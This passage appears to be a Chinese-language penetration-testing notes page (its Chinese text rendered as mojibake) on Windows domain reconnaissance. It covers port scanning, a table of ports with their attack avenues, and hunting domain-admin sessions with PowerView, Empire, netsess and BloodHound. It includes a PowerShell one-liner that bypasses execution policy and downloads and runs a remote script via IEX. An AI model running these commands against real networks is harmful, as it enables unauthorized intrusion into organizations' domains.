title="03.metasploitç«¯å£æ‰«æ"></a>03.metasploitç«¯å£æ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.1.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="04-PowerSploitçš„Invoke-Portscan-ps1"><a href="#04-PowerSploitçš„Invoke-Portscan-ps1" class="headerlink" title="04.PowerSploitçš„Invoke-Portscan.ps1"></a>04.PowerSploitçš„Invoke-Portscan.ps1</h3><p><code>æ— æ–‡ä»¶æ‰«æ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 10.10.10.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:\user\administrator\desktop\res.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="0x05-åŸŸå†…å¸¸è§ç«¯å£"><a href="#0x05-åŸŸå†…å¸¸è§ç«¯å£" class="headerlink" title="0x05.åŸŸå†…å¸¸è§ç«¯å£"></a>0x05.åŸŸå†…å¸¸è§ç«¯å£</h2><h3 id="01-æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£"><a href="#01-æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£" class="headerlink" title="01.æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£"></a>01.æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£</h3><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>21ã€22ã€69</td><td>FTP/TFTPæ–‡ä»¶ä¼ è¾“åè®®</td><td>å…è®¸åŒ¿åçš„ä¸Šä¼ ã€ä¸‹è½½çˆ†ç ´å’Œå—…æ¢æ“ä½œ</td></tr><tr><td>2049</td><td>NFSæœåŠ¡</td><td>é…ç½®ä¸å½“</td></tr><tr><td>137ã€138ã€139</td><td>Netbiso/SAMBAæœåŠ¡</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ</td></tr><tr><td>389</td><td>LDAPç›®å½•è®¿é—®åè®®</td><td>æ³¨å…¥ã€å…è®¸åŒ¿åè®¿é—®ã€å¼±å£ä»¤</td></tr><tr><td>135</td><td>DCOM/RPCæœåŠ¡</td><td>RPCé€šä¿¡æ¡¥æ¢</td></tr><tr><td>445</td><td>SMB</td><td>å…±äº«æ–‡ä»¶å¤¹(MS17-010),IPC$æœåŠ¡</td></tr></tbody></table><h3 id="02-è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"><a href="#02-è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£" class="headerlink" title="02.è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"></a>02.è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£</h3><table><thead><tr><th align="left">ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td align="left">22</td><td>SSHè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€SSHéš§é“åŠå†…ç½‘ä»£ç†è½¬å‘ã€æ–‡ä»¶ä¼ è¾“</td></tr><tr><td align="left">23</td><td>Telnetè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤</td></tr><tr><td align="left">3389</td><td>RDPè¿œç¨‹æ¡Œé¢è¿æ¥</td><td>Shiftåé—¨ï¼ˆWindows Server 2003ä»¥ä¸‹ç‰ˆæœ¬ï¼‰ã€çˆ†ç ´</td></tr><tr><td align="left">5900</td><td>VNC</td><td>å¼±å£ä»¤çˆ†ç ´</td></tr><tr><td align="left">5632</td><td>PcAnywhereæœåŠ¡</td><td>æŠ“å–å¯†ç ã€ä»£ç æ‰§è¡Œ</td></tr></tbody></table><h3 id="03-Webåº”ç”¨æœåŠ¡ç«¯å£"><a href="#03-Webåº”ç”¨æœåŠ¡ç«¯å£" class="headerlink" title="03.Webåº”ç”¨æœåŠ¡ç«¯å£"></a>03.Webåº”ç”¨æœåŠ¡ç«¯å£</h3><table><thead><tr><th align="left">ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td align="left">80ã€443ã€8080</td><td>å¸¸è§çš„WebæœåŠ¡ç«¯å£</td><td>Webæ”»å‡»ã€çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´</td></tr><tr><td align="left">7001ã€7002</td><td>Weblogicæ§åˆ¶å°</td><td>Javaååºåˆ—åŒ–ã€å¼±å£ä»¤</td></tr><tr><td align="left">8080ã€8089</td><td>JBoss/Resin/Jetty/Jenkins</td><td>ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤</td></tr><tr><td align="left">9090</td><td>WebSphereæ§åˆ¶å°</td><td>Javaååºåˆ—åŒ–ã€å¼±å£ä»¤</td></tr><tr><td align="left">4848</td><td>GlassFishæ§åˆ¶å°</td><td>å¼±å£ä»¤</td></tr><tr><td align="left">1352</td><td>Lotus Dominoé‚®ä»¶æœåŠ¡</td><td>å¼±å£ä»¤ã€ä¿¡æ¯æ³„éœ²ã€çˆ†ç ´</td></tr><tr><td align="left">10000</td><td>webminæ§åˆ¶é¢æ¿</td><td>å¼±å£ä»¤</td></tr></tbody></table><h3 id="04-æ•°æ®åº“æœåŠ¡ç«¯å£"><a href="#04-æ•°æ®åº“æœåŠ¡ç«¯å£" class="headerlink" title="04.æ•°æ®åº“æœåŠ¡ç«¯å£"></a>04.æ•°æ®åº“æœåŠ¡ç«¯å£</h3><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th><strong>ä½¿ç”¨è¯´æ˜</strong></th></tr></thead><tbody><tr><td>3306</td><td>MySQLæ•°æ®åº“</td><td>æ³¨å…¥ã€ææƒã€çˆ†ç ´</td></tr><tr><td>1433</td><td>MSSQLæ•°æ®åº“</td><td>æ³¨å…¥ã€ææƒã€SAå¼±å£ä»¤ã€çˆ†ç ´</td></tr><tr><td>1521</td><td>Oracleæ•°æ®åº“</td><td>TNSçˆ†ç ´ã€æ³¨å…¥ã€åå¼¹Shell</td></tr><tr><td>5432</td><td>PostgreSQLæ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥ã€å¼±å£ä»¤</td></tr><tr><td>27017ã€27018</td><td>MongoDBæ•°æ®åº“</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>6379</td><td>Redisæ•°æ®åº“</td><td>æœªæˆæƒè®¿é—®ã€å¼±å£ä»¤</td></tr><tr><td>5000</td><td>Sysbase/DB2æ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥</td></tr></tbody></table><h3 id="05-é‚®ä»¶æœåŠ¡å™¨ç«¯å£"><a href="#05-é‚®ä»¶æœåŠ¡å™¨ç«¯å£" class="headerlink" title="05.é‚®ä»¶æœåŠ¡å™¨ç«¯å£"></a>05.é‚®ä»¶æœåŠ¡å™¨ç«¯å£</h3><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>25</td><td>SMTPé‚®ä»¶æœåŠ¡</td><td>é‚®ä»¶ä¼ªé€ </td></tr><tr><td>110</td><td>POP3åè®®</td><td>çˆ†ç ´ã€å—…æ¢</td></tr><tr><td>143</td><td>IMAPåè®®</td><td>çˆ†ç ´</td></tr></tbody></table><h3 id="06-ç½‘ç»œå¸¸è§åè®®ç«¯å£"><a href="#06-ç½‘ç»œå¸¸è§åè®®ç«¯å£" class="headerlink" title="06.ç½‘ç»œå¸¸è§åè®®ç«¯å£"></a>06.ç½‘ç»œå¸¸è§åè®®ç«¯å£</h3><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>53</td><td>DNSåŸŸåç³»ç»Ÿ</td><td>å…è®¸åŒºåŸŸä¼ é€ã€DNSåŠ«æŒã€ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª—</td></tr><tr><td>67ã€68</td><td>DHCPæœåŠ¡</td><td>åŠ«æŒã€æ¬ºéª—</td></tr><tr><td>161</td><td>SNMPåè®®</td><td>çˆ†ç ´ã€æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯</td></tr></tbody></table><h3 id="07-ç‰¹æ®ŠæœåŠ¡ç«¯å£"><a href="#07-ç‰¹æ®ŠæœåŠ¡ç«¯å£" class="headerlink" title="07.ç‰¹æ®ŠæœåŠ¡ç«¯å£"></a>07.ç‰¹æ®ŠæœåŠ¡ç«¯å£</h3><table><thead><tr><th><strong>ç«¯å£å·</strong></th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>2181</td><td>ZooKeeperæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>8069</td><td>ZabbixæœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œã€SQLæ³¨å…¥</td></tr><tr><td>9200ã€9300</td><td>ElasticsearchæœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr><tr><td>11211</td><td>MemchachedæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>512ã€513ã€514</td><td>Linux rexecæœåŠ¡</td><td>çˆ†ç ´ã€è¿œç¨‹ç™»å½•</td></tr><tr><td>873</td><td>rsyncæœåŠ¡</td><td>åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼ </td></tr><tr><td>3690</td><td>SVNæœåŠ¡</td><td>svnæ³„éœ²ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>50000</td><td>SAP Management Console</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr><tr><td>88</td><td>KerberosæœåŠ¡</td><td>ç›‘å¬KDCç¥¨æ®è¯·æ±‚ï¼Œç¥¨æ®ä¼ªé€ </td></tr><tr><td>5985</td><td>WinRM</td><td>HTTP/HTTPSç›‘å¬</td></tr></tbody></table><h2 id="0x06-å®šä½åŸŸç®¡ç†å‘˜"><a href="#0x06-å®šä½åŸŸç®¡ç†å‘˜" class="headerlink" title="0x06.å®šä½åŸŸç®¡ç†å‘˜"></a>0x06.å®šä½åŸŸç®¡ç†å‘˜</h2><p><code>ä¸¤ç§æ–¹æ³•:ç®¡ç†å‘˜æ—¥å¿—ä¸ç™»å…¥ä¼šè¯ï¼Œä¸»è¦æ˜¯ä¼šè¯</code></p><h3 id="01-æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ"><a href="#01-æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ" class="headerlink" title="01.æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ"></a>01.æŸ¥çœ‹æœ¬æœºèµ„æºä½¿ç”¨æƒ…å†µ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="02-psloggedon-exe"><a href="#02-psloggedon-exe" class="headerlink" title="02.psloggedon.exe"></a>02.psloggedon.exe</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\10.10.10.10</span><br></pre></td></tr></table></figure><blockquote><p>é€šè¿‡æ³¨å†Œè¡¨HKEY_USERSçš„keyå€¼æŸ¥è¯¢è°ç™»å…¥è¿‡</p></blockquote><p><code>å‚æ•°</code></p><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>â€“</td><td>æ˜¾ç¤ºæ”¯æŒçš„é€‰é¡¹å’Œç”¨äºè¾“å‡ºå€¼çš„åº¦é‡å•ä½ã€‚</td></tr><tr><td>-l</td><td>ä»…æ˜¾ç¤ºæœ¬åœ°ç™»å½•ï¼Œè€Œä¸æ˜¾ç¤ºæœ¬åœ°å’Œç½‘ç»œèµ„æºç™»å½•ã€‚</td></tr><tr><td>-x</td><td>ä¸æ˜¾ç¤ºç™»å½•æ—¶é—´ã€‚</td></tr><tr><td>\\computername</td><td>æŒ‡å®šè¦ä¸ºå…¶åˆ—å‡ºç™»å½•ä¿¡æ¯çš„è®¡ç®—æœºçš„åç§°ã€‚</td></tr><tr><td>username</td><td>æŒ‡å®šç”¨æˆ·åï¼Œåœ¨ç½‘è·¯ä¸­æœç´¢è¯¥ç”¨æˆ·ç™»å…¥çš„è®¡ç®—æœº</td></tr></tbody></table><h3 id="03-PVEFindADUser-exe"><a href="#03-PVEFindADUser-exe" class="headerlink" title="03.PVEFindADUser.exe"></a>03.PVEFindADUser.exe</h3><blockquote><p>ç”¨äºæŸ¥æ‰¾æ´»åŠ¨ç›®å½•ç”¨æˆ·ç™»å½•ä½ç½®ï¼Œæšä¸¾åŸŸç”¨æˆ·ï¼ŒæŸ¥æ‰¾åœ¨ç‰¹å®šè®¡ç®—æœºä¸Šç™»å½•çš„ç”¨æˆ·ï¼ŒåŒ…æ‹¬æœ¬åœ°ç”¨æˆ·ï¼Œé€šè¿‡RDPç™»å½•çš„ç”¨æˆ·ï¼Œç”¨äºè¿è¡ŒæœåŠ¡å’Œè®¡åˆ’ä»»åŠ¡çš„ç”¨æˆ·ã€‚è¿è¡Œè¯¥å·¥å…·éœ€è¦.NET Framework2.0ç¯å¢ƒï¼Œå¹¶ä¸”å…·å¤‡ç®¡ç†å‘˜æƒé™ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe --current</span><br></pre></td></tr></table></figure><h3 id="04-netview-exe"><a href="#04-netview-exe" class="headerlink" title="04.netview.exe"></a>04.netview.exe</h3><blockquote><p>ä½¿ç”¨WinAPIæšä¸¾ç³»ç»Ÿï¼Œåˆ©ç”¨NetSessionEnumæ‰¾å¯»ç™»å½•ä¼šè¯ï¼Œåˆ©ç”¨NetShareEnumæ‰¾å¯»å…±äº«ï¼Œåˆ©ç”¨NetWkstaUserEnumæšä¸¾ç™»å½•çš„ç”¨æˆ·ã€‚å¤§éƒ¨åˆ†åŠŸèƒ½ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p></blockquote><p><code>å‚æ•°</code></p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>-f filename.txt</td><td>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ä»¥ä»ä¸­æå–ä¸»æœºåˆ—è¡¨</td></tr><tr><td>-e filename.txt**</td><td>æŒ‡å®šè¦æ’é™¤çš„ä¸»æœºåæ–‡ä»¶</td></tr><tr><td>-d domain</td><td>æŒ‡å®šè¦ä»ä¸­æ‹‰å‡ºä¸»æœºåˆ—è¡¨çš„åŸŸï¼Œå¦‚æœæœªæŒ‡å®šï¼Œåˆ™ä½¿ç”¨å½“å‰åŸŸ</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netview.exe -filenmae.txt &gt; res.txt</span><br></pre></td></tr></table></figure><h3 id="05-nmapçš„NSEè„šæœ¬"><a href="#05-nmapçš„NSEè„šæœ¬" class="headerlink" title="05.nmapçš„NSEè„šæœ¬"></a>05.nmapçš„NSEè„šæœ¬</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smb-enum-domains.nse    #å¯¹åŸŸæ§åˆ¶å™¨è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå¯ä»¥è·å–ä¸»æœºä¿¡æ¯ã€ç”¨æˆ·ã€å¯ä½¿ç”¨å¯†ç ç­–ç•¥çš„ç”¨æˆ·ç­‰</span><br><span class="line">smb-enum-groups.nse</span><br><span class="line">smb-enum-processes.nse    #è·å–ä¸»æœºè¿›ç¨‹</span><br><span class="line">smb-enum-services.nse</span><br><span class="line">smb-enum-sessions.nse    #è·å–ç”¨æˆ·ç™»å…¥ä¼šè¯</span><br><span class="line">smb-enum-shares.nse        #éå†è¿œç¨‹ä¸»æœºçš„å…±äº«ç›®å½•</span><br><span class="line">smb-enum-users.nse        #ç”¨æˆ·æƒé™ä¸å¤Ÿå¯ä»¥ä½¿ç”¨å®ƒå¯¹åŸŸæ§è¿›è¡Œæ‰«æ</span><br><span class="line">smb-flood.nse</span><br><span class="line">smb-ls.nse</span><br><span class="line">smb-mbenum.nse</span><br><span class="line">smb-os-discovery.nse    #è¿›è¡Œä¿¡æ¯æ”¶é›†</span><br></pre></td></tr></table></figure><h3 id="06-PowerViewè„šæœ¬"><a href="#06-PowerViewè„šæœ¬" class="headerlink" title="06.PowerViewè„šæœ¬"></a>06.PowerViewè„šæœ¬</h3><p><code>æ‰«æç›®æ ‡ç”¨æˆ·é›†ï¼Œä¸éœ€è¦ç®¡ç†æƒé™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\powerview.ps1; Invoke-UserHunter&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="07-Empireçš„user-hunteræ¨¡å—"><a href="#07-Empireçš„user-hunteræ¨¡å—" class="headerlink" title="07.Empireçš„user_hunteræ¨¡å—"></a>07.Empireçš„user_hunteræ¨¡å—</h3><p><code>æŸ¥æ‰¾åŸŸç®¡ç†å‘˜ç™»å…¥çš„æœºå™¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/powerview/user_hunter</span><br></pre></td></tr></table></figure><h2 id="0x07-è¿›ç¨‹æŸ¥è¯¢"><a href="#0x07-è¿›ç¨‹æŸ¥è¯¢" class="headerlink" title="0x07.è¿›ç¨‹æŸ¥è¯¢"></a>0x07.è¿›ç¨‹æŸ¥è¯¢</h2><h3 id="01-netsess-exe"><a href="#01-netsess-exe" class="headerlink" title="01.netsess.exe"></a>01.netsess.exe</h3><p><code>ä¼šè¯æŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsess.exe -h</span><br></pre></td></tr></table></figure><h3 id="02-äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨"><a href="#02-äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨" class="headerlink" title="02.äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨"></a>02.äº¤å‰å¼•ç”¨åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨</h3><blockquote><p>åŸŸæ§æ·»åŠ åˆ°dcs.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œä¸netsessåœ¨åŒä¸€ç›®å½•</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; session.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type session.txt | @findstr /I %a</span><br></pre></td></tr></table></figure><h3 id="03-æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡"><a href="#03-æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡" class="headerlink" title="03.æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡"></a>03.æŸ¥è¯¢è¿œç¨‹ç³»ç»Ÿä¸­è¿è¡Œçš„ä»»åŠ¡</h3><p><code>é¦–å…ˆè·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><code>å°†ç›®æ ‡ç³»ç»Ÿæ·»åŠ åˆ°ips.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œè¿è¡Œä»¥ä¸‹è„šæœ¬(å½“å‰è®¡ç®—æœºIP)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt;output.txt &amp;&amp; for /F %n in (admins.txt) do @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp;pause</span><br></pre></td></tr></table></figure><h3 id="04-åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯"><a href="#04-åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯" class="headerlink" title="04.åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯"></a>04.åˆ©ç”¨NetbiosæŸ¥è¯¢ä¼šè¯</h3><blockquote><p>å°†ç›®æ ‡ç³»ç»Ÿæ·»åŠ åˆ°ips.txtï¼ŒåŸŸç®¡ç†å‘˜æ·»åŠ åˆ°admins.txtï¼Œè¿è¡Œä»¥ä¸‹è„šæœ¬</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨nbtscanè¿›è¡ŒæŸ¥è¯¢</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><h2 id="0x08-PowerShellæ”¶é›†åŸŸä¿¡æ¯"><a href="#0x08-PowerShellæ”¶é›†åŸŸä¿¡æ¯" class="headerlink" title="0x08.PowerShellæ”¶é›†åŸŸä¿¡æ¯"></a>0x08.PowerShellæ”¶é›†åŸŸä¿¡æ¯</h2><p><code>Powershellçš„å››ç§æƒé™</code></p><blockquote><p>Restrictedï¼šé»˜è®¤è®¾ç½®ï¼Œä¸å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬ã€‚</p><p>Allsignedï¼šåªèƒ½è¿è¡Œç»è¿‡è¯ä¹¦éªŒè¯çš„è„šæœ¬ã€‚</p><p>Unrestirctedï¼šæƒé™æœ€é«˜ï¼Œå…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬ã€‚</p><p>RemoteSignedï¼šå¯¹æœ¬åœ°è„šæœ¬ä¸è¿›è¡Œé™åˆ¶ï¼Œå¯¹æ¥è‡ªç½‘ç»œçš„è„šæœ¬å¿…é¡»éªŒè¯å…¶ç­¾åã€‚</p></blockquote><h3 id="01-æƒé™ç›¸å…³"><a href="#01-æƒé™ç›¸å…³" class="headerlink" title="01.æƒé™ç›¸å…³"></a>01.æƒé™ç›¸å…³</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy        #æŸ¥çœ‹æƒé™</span><br><span class="line">Set-ExecutionPolicy UnRestricted    #ä¿®æ”¹æƒé™</span><br></pre></td></tr></table></figure><h3 id="02-å¯¼å…¥powerview-ps1"><a href="#02-å¯¼å…¥powerview-ps1" class="headerlink" title="02.å¯¼å…¥powerview.ps1"></a>02.å¯¼å…¥powerview.ps1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure><h3 id="03-å¸¸ç”¨å‘½ä»¤"><a href="#03-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="03.å¸¸ç”¨å‘½ä»¤"></a>03.å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PowerViewçš„å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</span><br><span class="line">Get-NetDomainï¼šè·å–å½“å‰ç”¨æˆ·æ‰€åœ¨çš„åŸŸã€‚</span><br><span class="line">Get-NetUserï¼šè·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetDomainControllerï¼šè·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetComputerï¼šè·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetOUï¼šè·å–åŸŸä¸­çš„OUä¿¡æ¯ã€‚</span><br><span class="line">Get-NetGroupï¼šè·å–æ‰€æœ‰åŸŸå†…ç»„æˆå‘˜çš„ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetFileServerï¼šæ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetShareï¼šè·å–å½“å‰åŸŸå†…æ‰€æœ‰çš„ç½‘ç»œå…±äº«ä¿¡æ¯ã€‚</span><br><span class="line">Get-NetSessionï¼šè·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯ã€‚</span><br><span class="line">Get-NetRDPSessionï¼šè·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥ã€‚</span><br><span class="line">Get-NetProcessï¼šè·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹ã€‚</span><br><span class="line">Get-UserEventï¼šè·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—ã€‚</span><br><span class="line">Get-ADObjectï¼šè·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡ã€‚</span><br><span class="line">Get-NetGPOï¼šè·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡ã€‚</span><br><span class="line">Get-DomainPolicyï¼šè·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥ã€‚</span><br><span class="line">Invoke-UserHunterï¼šè·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚</span><br><span class="line">Invoke-ProcessHunterï¼šé€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·ã€‚</span><br><span class="line">Invoke-UserEventHunterï¼šæ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›æœºå™¨ã€‚</span><br></pre></td></tr></table></figure><h2 id="0x09-BloodHoundåŸŸå†…åˆ†æå·¥å…·"><a href="#0x09-BloodHoundåŸŸå†…åˆ†æå·¥å…·" class="headerlink" title="0x09.BloodHoundåŸŸå†…åˆ†æå·¥å…·"></a>0x09.BloodHoundåŸŸå†…åˆ†æå·¥å…·</h2><p><code>é¦–å…ˆè¿›è¡Œä¿¡æ¯é‡‡é›†ï¼Œç„¶åå¯¼å…¥åˆ†æå³å¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure>]]></content>
    
    
